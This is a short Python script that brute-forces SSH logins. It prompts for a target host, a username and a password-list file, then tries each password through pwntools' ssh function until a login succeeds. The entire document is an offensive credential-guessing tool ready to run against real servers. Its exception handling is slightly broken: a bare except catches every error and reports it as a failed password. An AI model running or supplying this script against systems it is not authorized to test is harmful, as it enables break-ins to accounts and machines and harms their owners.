from pwn import *
import paramiko
import sys

host = input("Enter host: ex.127.0.0.1\n ")
username = input("Enter username: ex.root\n ")
attempts = 0

#Open file with read permissions 
with open(input("Enter file path ex./etc/passwd.txt\n "), "r") as password_list:
  print("[+] Starting brute force attack on " + host + " with username " + username)
  for password in password_list:
    password = password.strip("\n") #Stripping password
    try: 
      print("Trying: {}".format(password))
      #Utilizing ssh function from pwn library
      response = ssh(host=host, user=username, password=password, timeout=1) 
      #If the connection is successful
      if response.connected: 
        print("[+] Password found: {}".format(password))
        response.close()
        break
      #Closing if no response
      response.close() 
    except:
      paramiko.ssh_exception.AuthenticationException
      print("[-] Password not found: {}".format(password))
    attempts += 1